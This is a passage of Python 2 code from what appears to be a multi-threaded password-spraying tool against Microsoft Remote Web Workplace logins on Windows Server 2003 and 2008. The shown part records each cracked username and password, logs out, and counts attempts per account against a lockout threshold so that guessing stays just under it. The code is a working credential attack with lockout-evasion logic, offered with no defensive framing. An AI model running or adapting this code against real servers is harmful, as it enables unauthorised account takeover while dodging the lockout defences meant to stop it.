				grab_viewstate_evs()			
				Users_List.pop(n)
				break
				
			elif success_id_handler == 'threadd':
				print "Success!! - Username: "+Users_List[n] + " ----> Password: "+ threadd_current_pass
				print "Logging out of Remote Web Workplace..."
				Success_User_List.append(Users_List[n])
				Success_Passwd_List.append(threadd_current_pass)
				if cougar_mode == 0:
					d.setopt(pycurl.URL, Lurl_2k3)
				else:
					d.setopt(pycurl.URL, Lurl_2k8)
				d.perform()
				if n == len(Users_List)-1 and pass_count_against_user == last_lck_threshold + thold:	
					all_ran_through = 1				
				
				
				if n == len(Users_List)-1 and temp_pass_count == len(Passwd_List):
					break				
				
				if all_ran_through == 1:
					print ""
				else:
					temp_pass_count = temp_pass_count - temp_pass_count_2
					pass_count_against_user = pass_count_against_user - temp_pass_count_2					
				init_threads()
				grab_viewstate_evs()			
				Users_List.pop(n)
				break

			elif success_id_handler == 'threade':
				print "Success!! - Username: "+Users_List[n] + " ----> Password: "+ threade_current_pass
				print "Logging out of Remote Web Workplace..."
				Success_User_List.append(Users_List[n])
				Success_Passwd_List.append(threade_current_pass)
				if cougar_mode == 0:
					e.setopt(pycurl.URL, Lurl_2k3)			
				else:
					e.setopt(pycurl.URL, Lurl_2k8)
				e.perform()
				
				if n == len(Users_List)-1 and pass_count_against_user == last_lck_threshold + thold:	
					all_ran_through = 1

				if n == len(Users_List)-1 and temp_pass_count == len(Passwd_List):
					break
				
				if all_ran_through == 1:
					print ""
				else:
					temp_pass_count = temp_pass_count - temp_pass_count_2
					pass_count_against_user = pass_count_against_user - temp_pass_count_2						
				init_threads()
				grab_viewstate_evs()			
				Users_List.pop(n)
				break

			
			if n == len(Users_List)-1 and pass_count_against_user == last_lck_threshold + thold:			
				all_ran_through = 1
				
			if temp_pass_count == len(Passwd_List) and all_ran_through != 1:
				if n == len(Users_List)-1:
					break 
				temp_pass_count = temp_pass_count - temp_pass_count_2
				pass_count_against_user = pass_count_against_user - temp_pass_count_2
				break
				
			if pass_count_against_user == last_lck_threshold + thold:				
				pass_count_against_user = pass_count_against_user - thold
				temp_pass_count = pass_count_against_user
				break

		if success_id_handler == "":
			if n < len(Users_List):
				n = n + 1
		temp_pass_count_2 = 0
	print "Finished..."
	print "Closing all connections..."
	close_threads()
	Results()


